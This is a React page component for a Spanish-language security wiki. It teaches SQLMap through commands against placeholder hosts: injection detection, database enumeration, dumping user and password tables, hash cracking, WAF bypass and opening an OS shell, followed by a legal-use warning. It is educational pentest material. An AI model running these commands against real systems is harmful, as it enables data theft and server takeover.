'use client';

import Link from 'next/link';
import { useParams } from 'next/navigation';
import { Home, Terminal, Database } from 'lucide-react';

export default function SQLMapPage() {
  const params = useParams();
  const locale = params.locale as string;

  return (
    <div className="min-h-screen">
      <div className="bg-white dark:bg-slate-900/50 border-b border-slate-200 dark:border-slate-700 px-8 py-4">
        <div className="max-w-5xl mx-auto flex items-center gap-2 text-sm">
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors flex items-center gap-1">
            <Home className="w-4 h-4" />Wiki</Link>
          <span className="text-slate-600">/</span>
          <Link href={`/${locale}/wiki`} className="text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:text-white transition-colors">Herramientas</Link>
          <span className="text-slate-600">/</span>
          <span className="text-white dark:text-white">SQLMap</span>
        </div>
      </div>

      <div className="bg-gradient-to-r from-red-600 via-orange-600 to-yellow-600 px-8 py-12">
        <div className="max-w-5xl mx-auto">
          <div className="flex items-center gap-3 mb-4">
            <div className="px-3 py-1 bg-yellow-500/20 text-yellow-700 dark:text-yellow-300 rounded-lg text-sm font-medium border border-yellow-500/30">Intermedio</div>
            <div className="px-3 py-1 bg-white/10 backdrop-blur-sm text-slate-900 dark:text-white rounded-lg text-sm">22 min</div>
          </div>
          <h1 className="text-4xl md:text-5xl font-bold text-slate-900 dark:text-white mb-4 flex items-center gap-4">
            <Database className="w-12 h-12" />SQLMap</h1>
          <p className="text-xl text-red-100">Herramienta automática para detectar y explotar SQL injection</p>
        </div>
      </div>

      <div className="max-w-5xl mx-auto px-8 py-12">
        <div className="prose prose-invert prose-lg max-w-none">
          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">¿Qué es SQLMap?</h2>
            <p className="text-slate-700 dark:text-slate-300 mb-6">
              SQLMap es una herramienta de penetration testing open source que automatiza la detección y explotación 
              de vulnerabilidades de SQL injection. Soporta MySQL, PostgreSQL, Oracle, MSSQL, SQLite, y más.
            </p>
            
            <div className="bg-white/5 border border-white/10 rounded-xl p-6">
              <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">Capacidades</h3>
              <ul className="text-slate-700 dark:text-slate-300 space-y-2">
                <li>✅ Detecta 6 tipos de SQL injection (Boolean, Error, Union, Time-based, etc.)</li>
                <li>✅ Enumera DBs, tablas, columnas, datos</li>
                <li>✅ Dump completo de bases de datos</li>
                <li>✅ Shell interactivo en servidor (OS shell)</li>
                <li>✅ Bypass de WAF (Web Application Firewall)</li>
                <li>✅ Soporta HTTP cookies, headers, POST data</li>
              </ul>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Instalación</h2>
            <div className="bg-white/5 border border-white/10 rounded-xl p-6">
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-blue-600 dark:text-blue-400">
{`# Linux (apt)
sudo apt install sqlmap

# macOS
brew install sqlmap

# Kali Linux (pre-instalado)
sqlmap --version

# GitHub
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version`}
                </pre>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Comandos Básicos</h2>
            
            <div className="space-y-6">
              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">1. Detectar SQL Injection</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-green-600 dark:text-green-400">
{`# GET parameter
sqlmap -u "http://target.com/page?id=1"

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Con cookies
sqlmap -u "http://target.com/page?id=1" \
  --cookie="PHPSESSID=abc123; user=admin"

# Headers personalizados
sqlmap -u "http://target.com/api" \
  -H "Authorization: Bearer token123"`}
                  </pre>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">2. Enumerar Databases</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-purple-400">
{`# Listar todas las DBs
sqlmap -u "http://target.com/page?id=1" --dbs

# Output:
# [*] information_schema
# [*] mysql
# [*] app_database
# [*] users_db

# Obtener DB actual
sqlmap -u "http://target.com/page?id=1" --current-db`}
                  </pre>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">3. Enumerar Tablas</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-cyan-600 dark:text-cyan-400">
{`# Listar tablas de una DB
sqlmap -u "http://target.com/page?id=1" \
  -D users_db --tables

# Output:
# [*] users
# [*] passwords
# [*] sessions
# [*] admin_logs`}
                  </pre>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">4. Enumerar Columnas</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-yellow-400">
{`# Listar columnas de una tabla
sqlmap -u "http://target.com/page?id=1" \
  -D users_db -T users --columns

# Output:
# [*] id (INT)
# [*] username (VARCHAR)
# [*] password (VARCHAR)
# [*] email (VARCHAR)
# [*] role (VARCHAR)`}
                  </pre>
                </div>
              </div>

              <div className="bg-white/5 border border-white/10 rounded-xl p-6">
                <h3 className="text-xl font-semibold text-slate-900 dark:text-white mb-3">5. Dump Data</h3>
                <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                  <pre className="text-red-600 dark:text-red-400">
{`# Dump columnas específicas
sqlmap -u "http://target.com/page?id=1" \
  -D users_db -T users -C username,password --dump

# Dump tabla completa
sqlmap -u "http://target.com/page?id=1" \
  -D users_db -T users --dump

# Dump TODA la database
sqlmap -u "http://target.com/page?id=1" \
  -D users_db --dump-all`}
                  </pre>
                </div>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Opciones Avanzadas</h2>
            
            <div className="bg-white/5 border border-white/10 rounded-xl p-6">
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-blue-600 dark:text-blue-400">
{`# Risk level (1-3, más agresivo)
sqlmap -u "http://target.com/page?id=1" --risk=3

# Level (1-5, más payloads)
sqlmap -u "http://target.com/page?id=1" --level=5

# Técnicas específicas
# B: Boolean-based blind
# E: Error-based
# U: Union query
# T: Time-based blind
# Q: Inline queries
sqlmap -u "http://target.com/page?id=1" --technique=BEUT

# Bypass WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment

# Random User-Agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Threads (paralelización)
sqlmap -u "http://target.com/page?id=1" --threads=10

# OS Shell (si vulnerable)
sqlmap -u "http://target.com/page?id=1" --os-shell`}
                </pre>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Ejemplo Práctico</h2>
            <div className="bg-white/5 border border-white/10 rounded-xl p-6">
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-green-600 dark:text-green-400">
{`# 1. Detectar vulnerabilidad
sqlmap -u "http://vuln-site.com/product?id=5" --batch

# 2. Listar DBs
sqlmap -u "http://vuln-site.com/product?id=5" --dbs --batch

# 3. Listar tablas de 'shop_db'
sqlmap -u "http://vuln-site.com/product?id=5" -D shop_db --tables --batch

# 4. Dump tabla 'users'
sqlmap -u "http://vuln-site.com/product?id=5" \
  -D shop_db -T users --dump --batch

# Output guardado en:
# ~/.local/share/sqlmap/output/vuln-site.com/dump/shop_db/users.csv

# 5. Crackear passwords (si hash)
sqlmap -u "http://vuln-site.com/product?id=5" \
  -D shop_db -T users -C password --dump --batch \
  --passwords`}
                </pre>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">Burp Suite Integration</h2>
            <div className="bg-white/5 border border-white/10 rounded-xl p-6">
              <p className="text-slate-700 dark:text-slate-300 mb-4">
                Puedes exportar un request de Burp y usarlo directamente en SQLMap:
              </p>
              <div className="bg-slate-100 dark:bg-slate-800/50 rounded-lg p-4 font-mono text-sm">
                <pre className="text-purple-400">
{`# 1. En Burp: Right click > Copy to file > request.txt

# 2. Usar con SQLMap
sqlmap -r request.txt --batch

# El archivo request.txt contiene:
GET /page?id=1 HTTP/1.1
Host: target.com
Cookie: session=abc123
User-Agent: Mozilla/5.0`}
                </pre>
              </div>
            </div>
          </section>

          <section className="mb-12">
            <h2 className="text-3xl font-bold text-slate-900 dark:text-white mb-6">⚠️ Advertencias Legales</h2>
            <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-6">
              <ul className="text-slate-700 dark:text-slate-300 space-y-2">
                <li>❌ NUNCA uses SQLMap contra sitios sin autorización</li>
                <li>❌ Uso no autorizado es ILEGAL (Computer Fraud and Abuse Act)</li>
                <li>✅ Solo en entornos de testing propios o con permiso explícito</li>
                <li>✅ Usar en CTFs, labs, aplicaciones vulnerables intencionalmente</li>
              </ul>
            </div>
          </section>

          <div className="bg-gradient-to-r from-red-600/20 to-yellow-600/20 border border-red-500/30 rounded-xl p-8 text-center">
            <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente</h3>
            <Link href={`/${locale}/wiki/herramientas/nikto`}
              className="inline-flex items-center gap-2 px-6 py-3 bg-red-600 hover:bg-red-700 text-slate-900 dark:text-white rounded-xl font-semibold transition-all">
              Nikto<span>→</span></Link>
          </div>
        </div>
      </div>
    </div>
  );
}
